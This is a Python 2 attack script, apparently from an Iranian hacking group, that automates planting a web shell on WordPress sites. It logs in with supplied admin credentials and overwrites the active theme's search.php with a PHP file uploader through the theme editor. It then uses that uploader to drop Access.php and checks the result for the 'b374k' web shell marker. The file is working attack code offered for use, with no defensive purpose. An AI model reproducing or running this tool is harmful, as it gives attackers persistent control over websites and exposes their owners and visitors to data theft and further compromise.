import requests, os, sys, time, random, re
from colorama import Fore, Back, Style
reload(sys)
sys.setdefaultencoding('utf-8')

shell_code = '''
<title>Wordpress_project</title>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
?>
'''

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
           'Accept': '*/*'}

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """


    __          __           _
    \ \        / /          | | Iran-cyber.net
     \ \  /\  / /__  _ __ __| |_ __  _ __ ___  ___ ___
      \ \/  \/ / _ \| '__/ _` | '_ \| '__/ _ \/ __/ __|
       \  /\  / (_) | | | (_| | |_) | | |  __/\__ \__ |
        \/  \/ \___/|_|  \__,_| .__/|_|  \___||___/___/
             Version 1.0      | |
                              |_|
             Wordpress Automatic Upload Shell V 1.0
                Welcome To Wordpress_project : )
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)



cls()
print_logo()




def get_WpNoncE():
    try:
        find = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', source)
        path = find[0].strip()
        return path
    except:
        pass


def get_WpFlag():
    try:
        find = re.findall('<option value="(.*?)" selected="selected">', source)
        path = find[0].strip()
        return path
    except:
        pass


sess = requests.session()
try:
    url = sys.argv[1]
except IndexError:
        print Fore.YELLOW + '    --------------------------------------------------------------------- '
        print Fore.YELLOW + '    [*] ' + Fore.CYAN  + Fore.WHITE + ' python Script.py http://site.com'
        print(Style.RESET_ALL)
        sys.exit()


username = raw_input(str((Fore.CYAN) + '      Username > ' + (Fore.YELLOW)))
password = raw_input(str((Fore.CYAN) + '      Password > ' + (Fore.YELLOW)))

cls()
print_logo()

admin_re_page = url + '/wp-admin/'
login_go = url + '/wp-login.php'
post_parm = {'log': username,'pwd': password, 'wp-submit':'Log+In','redirect_to':admin_re_page, 'testcookie':'1'}

Get_login = sess.post(login_go, data=post_parm, headers=headers)

if '<li id="wp-admin-bar-logout">' in Get_login.text.encode('utf-8'):
    ___Get_editor = admin_re_page + 'theme-editor.php?file=search.php#template'
    ___Get_edit = admin_re_page + 'theme-editor.php'
    Get_source = sess.get(___Get_editor, headers=headers, timeout=5)
    source = Get_source.text
    _Wp_FlaG = get_WpFlag()
    _Wp_NoncE = get_WpNoncE()


    __data = {'_wpnonce':_Wp_NoncE,
          '_wp_http_referer':'/wp-admin/theme-editor.php?file=search.php',
          'newcontent': shell_code,
          'action': 'update',
          'file': 'search.php',
          'theme' :_Wp_FlaG,
          'scrollto': '0',
          'docs-list': '',
          'submit': 'Update+File'}


    sess.post(___Get_edit, data=__data, headers=headers)
    shell_PaTh = url + "/wp-content/themes/" + _Wp_FlaG + "/search.php"
    Check_sHell = sess.get(shell_PaTh, headers=headers)
    if 'Wordpress_project' in Check_sHell.text:
        __po = {'_upl': 'Upload'}
        fil = {'file': open('Access.php', 'rb')}
        upload_shell = requests.post(shell_PaTh, data=__po, files=fil)
        shell_PaTh_DoNe = url + "/wp-content/themes/" + _Wp_FlaG + '/Access.php'
        Got_Shell = requests.get(shell_PaTh_DoNe, timeout=5)
        if 'b374k' in Got_Shell.text:
            print Fore.YELLOW + '    [+] ' + Fore.CYAN + 'Shell ---> ' + Fore.GREEN + shell_PaTh_DoNe
            print(Style.RESET_ALL)
        else:
            print Fore.YELLOW + '    [+] ' + Fore.CYAN + 'Uploader ---> ' + Fore.GREEN + shell_PaTh
            print(Style.RESET_ALL)


    else:
        print Fore.YELLOW + '    [-] ' + Fore.CYAN + url + Fore.RED + ' ---> Shell Not Uploaded'
        print(Style.RESET_ALL)



else:
    print Fore.YELLOW + '    [-] ' + Fore.CYAN + url + Fore.WHITE + ' ---> i cant login :( try again'
    print(Style.RESET_ALL)

